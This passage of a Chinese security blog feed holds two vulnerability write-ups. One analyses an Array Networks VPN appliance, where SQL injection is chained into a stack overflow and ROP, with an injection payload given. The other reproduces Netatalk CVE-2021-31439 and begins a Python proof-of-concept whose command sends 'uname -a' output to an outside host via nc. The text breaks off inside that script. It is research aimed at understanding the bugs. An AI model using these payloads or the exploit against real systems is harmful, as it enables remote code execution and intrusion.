class="line">  xmlNewProp(repNode, <span class="string">&quot;DBMaj&quot;</span>, st);</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbVerMin);</span><br><span class="line">  xmlNewProp(repNode, <span class="string">&quot;DBMin&quot;</span>, st);</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbBuild);</span><br><span class="line">  xmlNewProp(repNode, <span class="string">&quot;DBBuild&quot;</span>, st);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>
<p>代码中使用 artdb_open 打开数据库，然后通过 artdb_rep_get_group_id 等 API 从数据库中查询相关数据，最后将结果转换成 XML 格式返回。其他接口功能类似。</p>
<p>请求和响应样例：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /replication/groupinfo HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">&lt;xml&gt;</span><br><span class="line">  &lt;GroupInfoRequest&gt;</span><br><span class="line">  &lt;/GroupInfoRequest&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 98</span><br><span class="line">Date: Wed, 16 Nov 2022 05:56:44 GMT</span><br><span class="line">Server: lighttpd/1.4.35</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;ART_REP&gt;&lt;GroupInfoReply GID=&quot;&quot; DBMaj=&quot;4&quot; DBMin=&quot;0&quot; DBBuild=&quot;7&quot;/&gt;&lt;/ART_REP&gt;</span><br></pre></td></tr></table></figure></div>

<p>通过对各个功能进行分析，可以找到多处使用不安全 API 处理字符数据的代码片段，例如函数 artdb_get_user_id：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_user_id</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> prmInstID, <span class="type">char</span> *prmUsername, <span class="type">int</span> *prmUserID)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-844h]</span></span><br><span class="line">  <span class="type">char</span> sql[<span class="number">2049</span>]; <span class="comment">// [rsp+40h] [rbp-820h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *eMsg; <span class="comment">// [rsp+848h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> rows; <span class="comment">// [rsp+850h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> cols; <span class="comment">// [rsp+854h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> **tblRes; <span class="comment">// [rsp+858h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( prmDB )</span><br><span class="line">  &#123;</span><br><span class="line">    eMsg = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where (%s=%d) and (lower(%s)=lower(&#x27;%s&#x27;))&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localusers&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;uname&quot;</span>,</span><br><span class="line">      prmUsername);</span><br><span class="line">    <span class="keyword">if</span> ( sqlite3_get_table(prmDB, sql, &amp;tblRes, &amp;rows, &amp;cols, &amp;eMsg) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">        englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to get users table (%s)&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>, eMsg);</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      v6 = <span class="number">-4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( rows &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *prmUserID = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = artdb_table_cell(<span class="number">0</span>, <span class="number">1</span>, cols);</span><br><span class="line">        *prmUserID = atoi(tblRes[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( rows &gt; <span class="number">1</span> &amp;&amp; englog_is_on() )</span><br><span class="line">          englog_helper(<span class="number">1u</span>, <span class="number">2u</span>, <span class="string">&quot;(%s) username %s has more than one row (%d)&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>, prmUsername, rows);</span><br><span class="line">      &#125;</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      sqlite3_free_table(tblRes);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) NULL database pointer&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>);</span><br><span class="line">    v6 = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 14 行使用 sprintf 函数构造 sql 查询语句，其中 prmUsername 参数是我们可控的数据，有很多途径都可以触发，那么这里显然存在栈溢出漏洞。另外，构造出来的 sql 语句没有经过任何过滤就使用 sqlite3_get_table 执行，存在 sql 注入漏洞。</p>
<h2 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h2><p>首先考虑栈溢出，目标程序信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p>没有开启保护措施，架构为 x64，由于数据是从 HTTP Query_String 传入的，所以不能出现特殊字符，如 00 字符。这就导致我们可能只能劫持返回地址，不能直接构造 ROP。</p>
<p>再次观察漏洞代码，sprintf 语句的 format string 在可控数据之后还有几个字符 <code>&#39;))</code>，由于这些字符会拼接在 payload 后面，导致也没办法劫持返回地址。</p>
<p>考虑 sql 注入漏洞，目标数据库是 sqlite，常规的利用思路可以从数据库中泄露某些敏感信息，或者是向 web 目录创建 php 后门、加载自己上传的 so 文件等。默认情况下 &#x2F;ca&#x2F;bin&#x2F;artdb 中应该没有内容，上传文件或向 web 目录写 php 都需要先绕过 web 登录，也难以实现。</p>
<h2 id="特殊形式的栈溢出"><a href="#特殊形式的栈溢出" class="headerlink" title="特殊形式的栈溢出"></a>特殊形式的栈溢出</h2><p>以上比较明显的漏洞暂时没有利用思路，继续分析代码。在 &#x2F;query&#x2F;hosts 路由对应的函数中有下面的逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">gnames = buf_get_delim_param(prmCon-&gt;uri.query-&gt;ptr, <span class="string">&quot;_role&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( gnames || !check_device_identification_result(db, instID, userID, uname-&gt;ptr, prmCon, &amp;devIDRes) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( gnames )</span><br><span class="line">    &#123;</span><br><span class="line">        buffer_urldecode_query(gnames);</span><br><span class="line">        ret = artdb_get_groupIDs_by_request(db, instID, gnames-&gt;ptr, &amp;groupIDs, &amp;count);</span><br><span class="line">        <span class="keyword">if</span> ( ret )</span><br><span class="line">            <span class="keyword">goto</span> done_and_close;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>获取用户参数 _role，进行 url 解码之后传入 artdb_get_groupIDs_by_request 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_groupIDs_by_request</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> instID, <span class="type">char</span> *gnames, <span class="type">int</span> **prmGroupIDs, <span class="type">int</span> *prmCount)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> groupID; <span class="comment">// [rsp+3Ch] [rbp-1024h] BYREF</span></span><br><span class="line">  <span class="type">int</span> groupIDs[<span class="number">1024</span>]; <span class="comment">// [rsp+40h] [rbp-1020h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *pCur; <span class="comment">// [rsp+1040h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *pNext; <span class="comment">// [rsp+1048h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *pName; <span class="comment">// [rsp+1050h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> ret; <span class="comment">// [rsp+1058h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+105Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( pCur = gnames; pCur; pCur = pNext + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pNext = <span class="built_in">strchr</span>(pCur, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !pNext )</span><br><span class="line">    &#123;</span><br><span class="line">      pName = pCur;</span><br><span class="line">      ret = artdb_get_group_id(prmDB, instID, pCur, &amp;groupID);</span><br><span class="line">      <span class="keyword">if</span> ( ret )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( groupID != <span class="number">-1</span> )</span><br><span class="line">        groupIDs[i++] = groupID;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pName = pCur;</span><br><span class="line">    *pNext = <span class="number">0</span>;</span><br><span class="line">    ret = artdb_get_group_id(prmDB, instID, pName, &amp;groupID);</span><br><span class="line">    <span class="keyword">if</span> ( ret )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( groupID != <span class="number">-1</span> )</span><br><span class="line">      groupIDs[i++] = groupID;</span><br><span class="line">  &#125;</span><br><span class="line">  *prmCount = i;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  *prmGroupIDs = <span class="built_in">malloc</span>(<span class="number">4LL</span> * i);</span><br><span class="line">  <span class="keyword">if</span> ( *prmGroupIDs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(*prmGroupIDs, <span class="number">0</span>, <span class="number">4LL</span> * i);</span><br><span class="line">    <span class="built_in">memcpy</span>(*prmGroupIDs, groupIDs, <span class="number">4LL</span> * i);</span><br><span class="line">LABEL_20:</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">    englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to allocate the user_webaclIDS (%d)&quot;</span>, <span class="string">&quot;artdb_get_groupIDs_by_request&quot;</span>, <span class="number">4LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数第三个参数是用户可控的 _role 参数，进入 for 循环对该字符串遍历，每次都寻找冒号。获取冒号之前的一项，将其作为参数传入 artdb_get_group_id 函数。由此可以推断 _role 是一种用冒号分隔的字符串数据。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_group_id</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> prmInstID, <span class="type">char</span> *prmGroupname, <span class="type">int</span> *prmGroupID)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-844h]</span></span><br><span class="line">  <span class="type">char</span> sql[<span class="number">2049</span>]; <span class="comment">// [rsp+40h] [rbp-820h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *eMsg; <span class="comment">// [rsp+848h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> rows; <span class="comment">// [rsp+850h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> cols; <span class="comment">// [rsp+854h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> **tblRes; <span class="comment">// [rsp+858h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( prmDB )</span><br><span class="line">  &#123;</span><br><span class="line">    eMsg = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where %s=%d and %s=&#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localgroups&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;groupname&quot;</span>,</span><br><span class="line">      prmGroupname);</span><br><span class="line">    <span class="keyword">if</span> ( sqlite3_get_table(prmDB, sql, &amp;tblRes, &amp;rows, &amp;cols, &amp;eMsg) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">        englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to get groups table (%s)&quot;</span>, <span class="string">&quot;artdb_get_group_id&quot;</span>, eMsg);</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      v6 = <span class="number">-4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( rows &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *prmGroupID = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = artdb_table_cell(<span class="number">0</span>, <span class="number">1</span>, cols);</span><br><span class="line">        *prmGroupID = atoi(tblRes[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( rows &gt; <span class="number">1</span> &amp;&amp; englog_is_on() )</span><br><span class="line">          englog_helper(</span><br><span class="line">            <span class="number">1u</span>,</span><br><span class="line">            <span class="number">2u</span>,</span><br><span class="line">            <span class="string">&quot;(%s) groupname %s has more than one row (%d)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;artdb_get_group_id&quot;</span>,</span><br><span class="line">            prmGroupname,</span><br><span class="line">            rows);</span><br><span class="line">      &#125;</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      sqlite3_free_table(tblRes);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) NULL database pointer&quot;</span>, <span class="string">&quot;artdb_get_group_id&quot;</span>);</span><br><span class="line">    v6 = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里从 localgroups 表中查找对应的 groupname 条目，获取到它的 groupID，经过 atoi 转换成 int 型数据返回。</p>
<p>返回之后在循环中将 ID 赋值到位于栈的数组 groupIDs 中，然后再处理下一项数据。向数组插入多少数据是根据 _role 参数中有多少项目决定的，也就是说如果数据库中的内容可控，那么我们就可以构造较长的 _role 参数，循环不断向 groupIDs 数组写入内容，最终将导致栈溢出。</p>
<p>这个栈溢出和其他位置的不同，由于写入的数据是 int 类型，我们无需担心特殊字符的问题，可以直接构造 ROP 完成利用。</p>
<h2 id="控制数据库"><a href="#控制数据库" class="headerlink" title="控制数据库"></a>控制数据库</h2><p>我们已经有 sql 注入漏洞，由于 sqlite 的特性，在一条 sql 语句之后拼接分号可以执行另一条语句。所以可以先将原始查询语句正确闭合，在分号后面向 localgroups 表中插入 payload 数据，最后注释掉后续的非法字符即可控制数据库中的数据。</p>
<p>sql 注入点有很多，我们选择 &#x2F;query&#x2F;clientverification2 路由，考察注入点：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where (%s=%d) and (lower(%s)=lower(&#x27;%s&#x27;))&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localusers&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;uname&quot;</span>,</span><br><span class="line">      prmUsername);</span><br></pre></td></tr></table></figure></div>
<p>和之前介绍的语句一样，注入部分首先构造字符串 <code>array&#39;));</code> 对 select 语句进行闭合，然后构造 insert 语句将数据插入表中，例如</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert/**/into/**/localgroups/**/(group_id,inst_id,groupname,params)/**/values/**/(123,1,&quot;test&quot;,&quot;p&quot;);/**/--</span><br></pre></td></tr></table></figure></div>
<p>空格部分用 <code>/**/</code> 替代。</p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>漏洞本质上是栈溢出，所以基本思路就是构造 ROP 去调用 system 执行命令。不过在利用过程中存在一些细节问题。</p>
<p><strong>1. 指针问题</strong></p>
<p>观察漏洞函数变量定义，在栈数组 groupIDs 下方有三个指针 pCur、pNext、pName，它们在 for 循环中起到定位的作用，如果在溢出过程中这些指针被非法数据覆盖，函数没执行到返回前就会崩溃。通过调试分析可以获取它们在被覆盖之前的值，在溢出数据中对这些值进行恢复即可。</p>
<p><strong>2. 参数问题</strong></p>
<p>由于溢出是以 int 型即每次 4 字节来覆盖的，所以我们的命令也要符合这个条件，每 4 字节取小端序，分批写入。</p>
<p><strong>调试</strong></p>
<p>系统中自带 gdb 程序，可直接在 shell 中调试。</p>
<p>你可以在 <a class="link"   href="https://gist.github.com/rrrrrrri/b94552a353f81f57ac6e6cc66062fedd" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上获取演示脚本。</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>请观看下面的演示视频</p>
<p><video controls height='100%' width='100%' src="/img/array_vxag_05.mp4"></video></p>
<p>本文内容到这里就结束了，我们将在下篇文章中介绍 License 和 VPN 的相关问题。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-31439</title>
    <url>/2022/04/02/CVE-2021-31439/</url>
    <content><![CDATA[<p>2021 年 5 月 24 日，ZDI 发布了关于影响群晖某些型号设备的 RCE 漏洞 CVE-2021-31439，2022 年 3 月 28 日，DEVCORE 发布了对于此漏洞的分析文章，文中只介绍了此漏洞的成因和利用思路，在实际复现过程中还存在一些问题，本文对一些问题进行分析。</p>
<span id="more"></span>

<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>受影响的组件是开源项目 Netatalk，该项目实现了苹果公司提出的 AFP 文件传输协议，并应用在很多 NAS 设备上，由于暂时没有目标设备，我在 ubuntu 16.04 虚拟机上编译安装了 Netatalk 3.1.12 模拟设备环境。</p>
<p>Netatalk 项目官网：<a class="link"   href="https://netatalk.sourceforge.io/" >https://netatalk.sourceforge.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>注：如果使用 apt 安装，得到的 afpd 程序一般是开启了所有保护措施，不方便进行复现。</p>
<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>详细的漏洞分析文章可在<a class="link"   href="https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS/" >DEVCORE 技术博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找到，这里不再赘述，我们要解决一些博客中没提到的问题。</p>
<h4 id="1-协议实现"><a href="#1-协议实现" class="headerlink" title="1. 协议实现"></a>1. 协议实现</h4><p>存在漏洞的程序实现了 AFP 文件传输协议，协议由苹果公司提出，它和 SMB 类似，不过在后续的发展过程中逐渐被抛弃了。</p>
<p>为了利用此漏洞，我们需要实现基本的 DSI 和 AFP 协议，以便于和服务器交互。网络上有一些 C 语言实现的 AFP 客户端，不过难以从其中剥离出有用的代码，我参考了 metasploit 中 AFP 信息扫描以及密码破解模块的实现，在 python 中简单实现了相关协议。</p>
<p>参考链接：<a class="link"   href="https://github.com/rapid7/metasploit-framework/pull/216/files" >https://github.com/rapid7/metasploit-framework/pull/216/files<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/afp/afp_login.rb" >https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/afp/afp_login.rb<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="2-触发前提"><a href="#2-触发前提" class="headerlink" title="2. 触发前提"></a>2. 触发前提</h4><p>在文章中提到漏洞是程序调用 dsi_stream_receive 函数读取 DSI 数据是出现问题，对应 DSI 中 command &#x3D; 2 情况，需要注意的是直接发送相关数据并不能来到漏洞点，首先需要构造 DSI_OpenSession 包新建一个 Session。</p>
<h4 id="3-利用思路"><a href="#3-利用思路" class="headerlink" title="3. 利用思路"></a>3. 利用思路</h4><p>文中笼统地指出利用思路为覆盖 _tls_dtor_list 指针，当程序调用 exit 时会来到 __call_tls_dtors 函数，在可控内存中构造好各个结构体即可劫持控制流进而实现 RCE。</p>
<p>在实际调试过程中存在一些需要注意的点，如在泄露出 canary 之后还要继续泄露到 libc 地址，否则覆盖 TLS 结构时会由于某些指针异常导致程序崩溃。</p>
<p>泄露 libc 地址时在某些特殊的内存布局情况下会导致泄露出来的地址有一些偏移，需要编写代码过滤这些情况。</p>
<p>清空 pointer_guard 后再调用某些功能会由于指针解密失败导致程序崩溃，所以我们要仔细编排布置 payload 的顺序，经过测试发现需要先布置 bss 结构，然后再布置 TLS 结构。</p>
<p>另外也是最重要的一点，文章中写到劫持控制流后可以通过调用 execl 来实现任意代码执行，但 execl 需要控制好各个参数。这里用到的思路是 CTF 中的 SROP，先劫持控制流到 setcontext 函数，调整好各个寄存器的值，再跳转到 IO_proc_open 函数中调用 execl 函数的位置。</p>
<p>调试好各个变量的偏移之后可以写出能够执行任意命令的 poc：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2021-31439-1.png"
                     
                ></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">R_HOST = <span class="string">&quot;192.168.152.133&quot;</span></span><br><span class="line">R_PORT = <span class="number">548</span></span><br><span class="line"></span><br><span class="line">SUPPORT_VERSION = [<span class="string">&quot;Netatalk3.1.12&quot;</span>]</span><br><span class="line"></span><br><span class="line">DSI_CloseSession     = <span class="number">0x01</span></span><br><span class="line">DSI_Common           = <span class="number">0x02</span></span><br><span class="line">DSI_FPGetSrvrInfo    = <span class="number">0x03</span></span><br><span class="line">DSI_OpenSession      = <span class="number">0x04</span></span><br><span class="line"></span><br><span class="line">MAX_RECV_LENGTH = <span class="number">4096</span></span><br><span class="line">DSI_SERVQUANT_DEF = <span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line">nl_global_locale_padding_offset = <span class="number">0x102678</span></span><br><span class="line">dtor_list_padding_offset = <span class="number">0x1026b0</span></span><br><span class="line">tls_padding_length = <span class="number">0x1026f0</span>    <span class="comment"># padding to TLS</span></span><br><span class="line">nl_global_locale_offset = <span class="number">0x3c5420</span></span><br><span class="line">username_address = <span class="number">0x656190</span></span><br><span class="line">username = (<span class="string">&quot;iot&quot;</span>.ljust(<span class="number">16</span>, <span class="string">&quot;\x00&quot;</span>)).encode()</span><br><span class="line">command = <span class="string">b&quot;`uname -a | nc 192.168.152.129 31337`&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSI</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dsi_flags, dsi_command, dsi_requestID, dsi_dataOffset, dsi_len, dsi_reserved</span>):</span><br><span class="line">        self.dsi_flags = dsi_flags</span><br><span class="line">        self.dsi_command = dsi_command</span><br><span class="line">        self.dsi_requestID = dsi_requestID</span><br><span class="line">        self.dsi_dataOffset = dsi_dataOffset</span><br><span class="line">        self.dsi_len = dsi_len</span><br><span class="line">        self.dsi_reserved = dsi_reserved</span><br><span class="line"></span><br><span class="line">        self.header_length = <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gen_packet</span>(<span class="params">self, data=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">        packet = <span class="string">b&quot;&quot;</span></span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_flags)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_command)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!H&quot;</span>, self.dsi_requestID)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_dataOffset)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_len)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_reserved)</span><br><span class="line">        packet += data</span><br><span class="line">        <span class="keyword">return</span> packet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_body_error_code</span>(<span class="params">packet</span>):</span><br><span class="line">    flags = packet[<span class="number">0</span>]</span><br><span class="line">    command = packet[<span class="number">1</span>]</span><br><span class="line">    request_id = packet[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    error_code = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    length = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]</span><br><span class="line">    reserved = packet[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    body = packet[<span class="number">16</span>:length + <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> length != <span class="built_in">len</span>(body):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Invalid packet length&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (error_code, body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_srvInfo</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># https://github.com/rapid7/metasploit-framework/pull/216/files</span></span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line"></span><br><span class="line">    machine_type_offset = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, body[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    version_count_offset = body[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    uam_count_offset = body[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">    icon_offset = body[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line">    flags = body[<span class="number">8</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    server_name_length = body[<span class="number">10</span>]</span><br><span class="line">    